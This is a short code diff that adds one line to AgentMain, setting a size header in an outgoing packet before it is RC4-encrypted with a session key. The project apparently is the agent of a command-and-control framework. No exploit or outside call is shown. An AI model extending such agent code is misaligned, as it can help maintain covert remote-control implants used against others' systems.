@@ -61,6 +61,7 @@ void AgentMain()
 
 	g_Agent->commander->Exit(packerOut);
 
+	packerOut->Set32(0, packerOut->GetDataSize());
 	BYTE* data     = packerOut->GetData();
 	ULONG dataSize = packerOut->GetDataSize();
 	EncryptRC4(data, dataSize, g_Agent->SessionKey, 16);
